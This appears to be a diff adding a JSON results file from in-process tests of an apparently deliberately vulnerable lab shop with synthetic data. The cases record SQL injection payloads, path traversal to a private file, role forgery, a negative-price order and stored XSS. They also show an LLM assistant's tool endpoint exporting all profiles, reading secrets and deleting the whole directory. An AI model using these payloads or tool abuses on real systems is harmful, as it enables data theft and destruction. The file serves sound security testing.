@@ -1,0 +1,610 @@
+{
+  "http_cases": [
+    {
+      "id": "H01-invalid-json",
+      "transport": "BaseHTTPRequestHandler with BytesIO, no TCP",
+      "status": 500,
+      "headers": "HTTP/1.0 500 Internal Server Error\r\nServer: BaseHTTP/0.6 Python/3.14.5\r\nDate: Sun, 25 Oct 2026 16:56:22 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 115",
+      "body": "{\"error\": \"Expecting property name enclosed in double quotes: line 1 column 2 (char 1)\", \"type\": \"JSONDecodeError\"}"
+    },
+    {
+      "id": "H02-array",
+      "transport": "BaseHTTPRequestHandler with BytesIO, no TCP",
+      "status": 500,
+      "headers": "HTTP/1.0 500 Internal Server Error\r\nServer: BaseHTTP/0.6 Python/3.14.5\r\nDate: Sun, 25 Oct 2026 16:56:22 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 75",
+      "body": "{\"error\": \"'list' object has no attribute 'get'\", \"type\": \"AttributeError\"}"
+    },
+    {
+      "id": "H03-content-type",
+      "transport": "BaseHTTPRequestHandler with BytesIO, no TCP",
+      "status": 401,
+      "headers": "HTTP/1.0 401 Unauthorized\r\nServer: BaseHTTP/0.6 Python/3.14.5\r\nDate: Sun, 25 Oct 2026 16:56:22 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 32",
+      "body": "{\"error\": \"invalid credentials\"}"
+    },
+    {
+      "id": "H04-length",
+      "transport": "BaseHTTPRequestHandler with BytesIO, no TCP",
+      "status": 500,
+      "headers": "HTTP/1.0 500 Internal Server Error\r\nServer: BaseHTTP/0.6 Python/3.14.5\r\nDate: Sun, 25 Oct 2026 16:56:22 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 80",
+      "body": "{\"error\": \"invalid literal for int() with base 10: 'wat'\", \"type\": \"ValueError\"}"
+    }
+  ],
+  "service_sha256": "8cb3abeaaf7bb647cbbd9d1c9a0ea50375c70c30110313f5015468ded24b7569",
+  "transport": "in-process; not an HTTP or LLM run",
+  "cases": [
+    {
+      "id": "A01-anonymous-profile",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/profile?id=1",
+        "body": {},
+        "actor": null
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A02-foreign-profile",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/profile?id=2",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A03-sql-profile",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/profile?id=1%20OR%201=1",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A04-sql-search",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/search?q=%27%20OR%201%3D1%20--",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A05-sql-context",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/assistant/context?order_id=1%20OR%201=1",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": {
+        "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A06-role-forgery",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/admin/export",
+        "body": {},
+        "actor": "forged-staff"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A07-price",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/orders",
+        "body": {
+          "product": "chair",
+          "price": -100
+        },
+        "actor": "alice"
+      },
+      "status": 201,
+      "response": {
+        "id": 3,
+        "owner": 1,
+        "product": "chair",
+        "price": -100
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A08-path-traversal",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/files?user=alice&path=../../private/operator-note.txt",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": {
+        "content": "TEST_ONLY_OPERATOR_SECRET"
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A09-foreign-orders",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/orders",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "owner": 1,
+          "product": "chair",
+          "price": 5000.0
+        },
+        {
+          "id": 2,
+          "owner": 2,
+          "product": "lamp",
+          "price": 1500.0
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A10-tool-export",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/assistant/execute",
+        "body": {
+          "decision": {
+            "tool": "export_profiles",
+            "arguments": {}
+          }
+        },
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        },
+        {
+          "id": 2,
+          "name": "TEST_BOB",
+          "email": "bob@example.invalid",
+          "address": "TEST_ADDRESS_B"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A11-tool-private",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/assistant/execute",
+        "body": {
+          "decision": {
+            "tool": "read_file",
+            "arguments": {
+              "path": "private/operator-note.txt"
+            }
+          }
+        },
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": {
+        "content": "TEST_ONLY_OPERATOR_SECRET"
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A12-tool-delete",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/assistant/execute",
+        "body": {
+          "decision": {
+            "tool": "delete_tree",
+            "arguments": {
+              "path": "."
+            }
+          }
+        },
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": {
+        "deleted": "."
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": []
+    },
+    {
+      "id": "A13-stored-xss",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/reviews/view",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": "<html><body><p><script>alert('lab')</script></p></body></html>",
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A14-secret-logs",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/debug/logs",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "method": "POST",
+          "target": "/login",
+          "body": {
+            "username": "alice",
+            "password": "learn-alice"
+          },
+          "headers": {}
+        },
+        {
+          "method": "GET",
+          "target": "/debug/logs",
+          "body": {},
+          "headers": {
+            "X-Token": "<synthetic-alice-token>"
+          }
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "A15-malformed-order",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/orders",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": "uncaught",
+      "response": {
+        "type": "KeyError",
+        "error": "'product'"
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "C01-own-profile",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/profile?id=1",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": [
+        {
+          "id": 1,
+          "name": "TEST_ALICE",
+          "email": "alice@example.invalid",
+          "address": "TEST_ADDRESS_A"
+        }
+      ],
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "C02-own-receipt",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "GET",
+        "target": "/files?user=alice&path=receipt.txt",
+        "body": {},
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": {
+        "content": "TEST_ALICE receipt: chair, 5000 RUB"
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "C03-purchase",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/orders",
+        "body": {
+          "product": "lamp"
+        },
+        "actor": "alice"
+      },
+      "status": 201,
+      "response": {
+        "id": 3,
+        "owner": 1,
+        "product": "lamp",
+        "price": 1500
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    },
+    {
+      "id": "C04-assistant-receipt",
+      "transport": "Shop.dispatch in-process",
+      "request": {
+        "method": "POST",
+        "target": "/assistant/execute",
+        "body": {
+          "decision": {
+            "tool": "read_file",
+            "arguments": {
+              "path": "files/alice/receipt.txt"
+            }
+          }
+        },
+        "actor": "alice"
+      },
+      "status": 200,
+      "response": {
+        "content": "TEST_ALICE receipt: chair, 5000 RUB"
+      },
+      "files_before": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ],
+      "files_after": [
+        "files/alice/receipt.txt",
+        "files/bob/receipt.txt",
+        "private/operator-note.txt"
+      ]
+    }
+  ]
+}
